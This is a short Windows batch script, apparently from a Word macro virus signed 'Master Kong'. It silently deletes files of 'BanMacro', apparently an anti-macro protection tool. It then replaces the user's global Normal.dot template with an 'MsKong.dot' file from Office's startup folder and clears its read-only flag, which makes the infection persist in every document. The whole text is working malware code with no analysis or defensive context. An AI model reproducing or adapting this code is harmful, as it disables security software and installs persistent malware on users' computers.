   @Echo Off
   Rem This Line For Master Kong
   If Exist "C:\Program Files\BanMacro\BanMacro.*" Del "C:\Program Files\BanMacro\BanMacro.*" > nul
   If Exist "c:\program files\microsoft office\office\startup\MsKong.dot" Del "C:\Program Files\Microsoft Office\Templates\Normal.dot" > nul
   If Exist "c:\program files\microsoft office\office\startup\MsKong.dot" Copy "c:\program files\microsoft office\office\startup\MsKong.dot" "C:\Program Files\Microsoft Office\Templates\Normal.dot" > nul
   Attrib -r "C:\Program Files\Microsoft Office\Templates\Normal.dot" > nul
